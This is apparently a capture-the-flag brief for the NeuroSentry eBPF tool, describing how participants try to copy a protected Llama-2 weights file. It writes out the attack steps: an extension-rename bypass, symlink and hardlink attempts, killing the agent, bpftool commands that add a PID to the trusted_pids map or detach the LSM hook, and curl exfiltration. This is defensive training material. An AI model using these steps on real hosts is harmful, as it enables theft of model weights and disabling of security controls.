# CAPTURE THE MODEL — Challenge Brief

```
+-------------------------------------------------------------------+
|         NEUROSENTRY: CAPTURE THE MODEL                            |
|         15-minute hands-on lab challenge                          |
+-------------------------------------------------------------------+
```

## Mission

You have shell in an inference workload container (`attacker`). A 13 GB
Llama-2-7B weights file is bind-mounted read-only at:

```
/target/llama-2-7b.safetensors
```

Get the file out to `/tmp/stolen/llama-2-7b.safetensors` with the bytes
intact (MD5 verified by the scoring server). You have 15 minutes.

NeuroSentry is running on the host kernel with the LSM `file_open` hook in
**enforce mode**: protected extensions opened by untrusted PIDs are blocked
with `-EPERM` at the VFS layer. That is not a log line — it is a real syscall
failure.

## Environment

```
[attacker container]                  [neurosentry container]
  alpine:3.19                           privileged
  privileged, --cap-add ALL             pid=host, network=host
  network_mode: host                    LSM file_open  -> ENFORCE
  /target  (ro bind mount)              TC ingress/egress -> MONITOR
  /workspace                            XDP -> MONITOR
  Tools: cp, dd, cat, python3,          Uprobes (pytorch/pickle/tf/onnx)
         curl, nc, nmap, bpftool*       Metrics on :2112
                                        Logs in /var/log/neurosentry/

[scoring server]
  http://localhost:8080
  /status  /submit  /verify  /leaderboard  /attempts
```

`bpftool` requires `apk add bpftool` inside the attacker container; it is
not preinstalled. Other privileged probing tools (e.g. `bcc-tools`) you
install at your own risk against the 15-minute clock.

## Three-Tier Attack Progression

Work down the list. Each tier teaches a different lesson. Submit each
attempt to `/submit` — even failed attempts count toward the White Hat tier.

### Tier 1 — Obvious reads (all blocked)

The LSM hook fires before the kernel returns a usable fd. Every one of these
returns the same `-EPERM`:

```sh
cp  /target/llama-2-7b.safetensors /tmp/stolen/
cat /target/llama-2-7b.safetensors > /tmp/stolen/out
dd  if=/target/llama-2-7b.safetensors of=/tmp/stolen/out bs=1M
python3 -c "open('/target/llama-2-7b.safetensors','rb').read(1)"
tar  cf /tmp/stolen/x.tar /target/llama-2-7b.safetensors
```

Expected:

```
cp: can't open '/target/llama-2-7b.safetensors': Operation not permitted
```

Confirm in the kernel log stream:

```sh
docker logs --tail 30 neurosentry | grep file_blocked
```

### Tier 2 — Evasion (mostly blocked, one honest gap)

| Technique | Result | Why |
|-----------|--------|-----|
| **Rename the extension first** (`cp /target/llama-2-7b.safetensors /tmp/x.bin.bak`) | **Bypass succeeds** if the new name has no protected extension | Detection is filename-extension based. This is a deliberate teaching gap — see "Known Limitations". |
| **Symlink trick** (`ln -s /target/llama-2-7b.safetensors /tmp/x.txt && cat /tmp/x.txt`) | Blocked | LSM resolves the final dentry; the original `.safetensors` extension is still on the file being opened. |
| **Hardlink** (`ln /target/llama-2-7b.safetensors /tmp/x.txt`) | Blocked under `/target` ro mount; on writable fs the new dentry name `x.txt` would have no protected extension | Same extension-only caveat as rename. # TODO verify on Linux host across mounts |
| **`/proc/<neurosentry-pid>/mem` scrape** | Blocked | LSM `file_open` matches on the file path; `/proc/PID/mem` opens hit the same hook and the protected paths are not what you want anyway — model bytes are not paged into the agent. |
| **Kill the agent** (`pkill neurosentry`) | Auto-restart | Container `restart: unless-stopped`. Even between restart and reattach, mounts stay; LSM programs persist if pinned. |
| **`docker rm -f neurosentry`** | Container restarts via compose | Same as above. The model file mount is still ro. |

The extension-rename bypass is the intended **Tier 2 win**. If you find it,
submit it as a Grey Hat and explain how content-based detection (magic-byte
check on the safetensors header) would close the gap.

### Tier 3 — Privileged attacks (all audited)

The attacker container has `--cap-add ALL` and `privileged: true`, so you
can reach the BPF subsystem directly. Every one of these is logged with a
`SECURITY:` prefix in the agent log.

```sh
# Install bpftool inside the attacker container
apk add bpftool

# Inspect what's loaded
bpftool prog show
bpftool map show

# The dangerous move: add your own PID to trusted_pids
MY_PID=$$
TRUSTED_MAP=$(bpftool map show | awk '/trusted_pids/{print $1}' | tr -d :)
bpftool map update id $TRUSTED_MAP key $(printf '%08x' $MY_PID | sed 's/../0x& /g') value 0x01
# Now reads from your shell will succeed -- but the map mutation hit the audit log.
```

```sh
# Detach the LSM hook (requires CAP_SYS_ADMIN; logged)
bpftool link show
bpftool link detach id <link_id>
```

If you reach Tier 3 and successfully exfiltrate, you still get the Black
Hat — but the debrief will include the audit trail showing exactly what
you did. In production NeuroSentry these audits would page a SOC.

### Out of scope for this lab

- **Network exfiltration** is monitored, not blocked. `curl --data-binary`
  to an external host will not stop you — but you need read access to the
  file first (Tier 1 fails closed). The Grafana panel will show your egress
  flow as it happens.
- **Container escape / kernel exploits**: not the goal of this lab. If you
  find a real one, please report it privately per [SECURITY.md](../../SECURITY.md).
- **DoS against other participants' lanes**: don't.

## Scoring

```sh
# Submit each attempt (success=true once you've actually copied bytes)
curl -X POST http://localhost:8080/submit \
  -H 'Content-Type: application/json' \
  -d '{"method":"cp","success":false,"details":"EPERM at LSM file_open"}'

# Verify exfiltration (server MD5s the file you wrote)
curl -X POST http://localhost:8080/verify \
  -H 'Content-Type: application/json' \
  -d '{"file_path":"/tmp/stolen/llama-2-7b.safetensors"}'
```

## Prize Tiers

| Hat | Criteria |
|-----|----------|
| Black Hat | MD5 match on `/tmp/stolen/llama-2-7b.safetensors` at the scoring server |
| White Hat | 10+ documented attempts via `/submit` |
| Grey Hat  | Novel bypass we did not anticipate (the extension-rename one is known) |
| Red Hat   | Real security bug in NeuroSentry — credit in `SECURITY.md` and a public thank-you |

## Known Limitations (read these — they're free hints)

1. **Extension-based detection.** The LSM hook matches on the file's
   final-component extension. Rename to remove the extension and the hook
   does not match. Mitigation in production: content-based detection on
   the safetensors magic header.
2. **Network is monitor-only.** TC and XDP log egress, do not drop. The
   demo's `network_mode: host` setup makes drop-mode unsafe for the
   scoring server itself.
3. **Root inside `attacker` can mutate BPF maps.** All mutations are
   audited; none are cryptographically sealed in this version.
4. **Uprobe coverage is symbol-table dependent.** The pickle / torch.load
   uprobes only fire if the runtime symbols are present and resolved.

## Useful Commands

```sh
# Inside attacker
cat /workspace/mission.txt
ls -la /target/

# From the host
docker logs -f neurosentry
curl -s http://localhost:2112/metrics | grep -E 'neurosentry_(events|threats)_total'
```

Good luck. Be brisk, be honest about what worked, and submit every attempt.

— github.com/tonghuaroot/neurosentry
